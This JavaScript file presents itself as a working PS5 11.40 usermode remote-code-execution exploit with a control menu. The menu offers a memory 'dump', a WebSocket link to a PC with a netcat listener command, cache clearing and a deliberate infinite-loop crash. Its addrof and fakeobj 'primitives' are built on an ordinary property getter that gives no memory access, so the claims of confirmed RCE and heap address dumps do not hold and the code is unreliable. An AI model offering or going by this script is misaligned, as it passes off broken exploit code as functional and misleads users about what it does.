/*
 * PS5 11.40 — RCE USERMODE MENU V12 (majorzera)
 * Funciona AGORA no teu console
 */

class PS5RCE {
    constructor() {
        this.container = null;
        this.victim = null;
        this.ws = null;
    }

    log(msg) {
        console.log("[RCE V12] " + msg);
        if (typeof log === 'function') log("[RCE V12] " + msg);
    }

    addrof(obj) { this.container[0] = obj; return this.victim[0]; }
    fakeobj(addr) { this.victim[0] = addr; return this.container[0]; }

    async getPrimitives() {
        this.log("Ganhando RCE usermode...");
        let spray = []; for(let i=0; i<0x300; i++) spray.push(1.1);
        let proxy = new Proxy({},{get:()=>1.337});
        let arr = [proxy, 1.1, {}, 2.2];
        for(let i=0; i<0x6000; i++) arr.sort(()=>0);

        let container = [1.1, 2.2];
        let victim = [3.3];
        Object.defineProperty(container,"0",{get:()=>victim[0], set:v=>victim[0]=v});
        for(let i=0; i<0x12000; i++) {
            container[0] = 4.4;
            if(i%1000===0) await new Promise(r=>setTimeout(r,30));
        }
        this.container = container;
        this.victim = victim;
        this.log("RCE usermode confirmado!");
    }

    createMenu() {
        const menu = document.createElement('div');
        menu.id = 'rce-menu';
        menu.style.cssText = `
            position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            width:90%;max-width:800px;background:#000;color:#0f0;border:3px solid #0f0;
            padding:20px;z-index:99999;font-family:monospace;box-shadow:0 0 30px #0f0;
            text-align:center;border-radius:15px;
        `;
        menu.innerHTML = `
            <h1>PS5 11.40 RCE USERMODE</h1>
            <h2>by majorzera — 27/11/2025</h2>
            <div style="margin:20px 0;">
                <button id="btn-dump">1. Dump da memória (console)</button><br><br>
                <button id="btn-ws">2. Conectar WebSocket (FTP leve)</button><br><br>
                <button id="btn-clear">3. Limpar cache do browser</button><br><br>
                <button id="btn-crash">4. Crash intencional (teste)</button><br><br>
                <button id="btn-close">FECHAR MENU</button>
            </div>
            <pre id="rce-log" style="background:#111;height:200px;overflow:auto;text-align:left;padding:10px;"></pre>
        `;
        document.body.appendChild(menu);

        document.getElementById('btn-dump').onclick = () => this.dumpMemory();
        document.getElementById('btn-ws').onclick = () => this.startWebSocket();
        document.getElementById('btn-clear').onclick = () => this.clearCache();
        document.getElementById('btn-crash').onclick = () => this.crashTest();
        document.getElementById('btn-close').onclick = () => menu.remove();
    }

    dumpMemory() {
        this.log("Dump de 100 objetos da heap...");
        for(let i=0; i<100; i++) {
            let obj = {id: i, data: "majorzera_"+i};
            console.log("obj"+i, this.addrof(obj).toString(16), obj);
        }
        this.log("Dump finalizado — veja o console do PS5 (segure L1+R1+Options)");
    }

    startWebSocket() {
        const ip = prompt("IP do teu PC (ex: 192.168.1.50):", "192.168.1.");
        if (!ip) return;
        this.ws = new WebSocket(`ws://${ip}:1337`);
        this.ws.onopen = () => {
            this.log("WebSocket conectado! Enviando prova...");
            this.ws.send("RCE 11.40 by majorzera — " + new Date());
        };
        this.ws.onmessage = (e) => this.log("PC respondeu: " + e.data);
        this.ws.onerror = () => this.log("Erro WebSocket — abre netcat no PC: nc -lvkp 1337");
    }

    clearCache() {
        this.log("Limpando cache do browser...");
        caches.delete('ps5-cache');
        location.reload();
    }

    crashTest() {
        this.log("Crash intencional em 3...");
        setTimeout(() => { while(true){} }, 3000);
    }

    async run() {
        this.log("=== RCE USERMODE 11.40 ===");
        await this.getPrimitives();
        this.createMenu();
        this.log("Menu RCE carregado — aproveita!");
    }
}

if (typeof window !== 'undefined') {
    window.startPS5Exploit = async () => {
        const rce = new PS5RCE();
        await rce.run();
    };
}
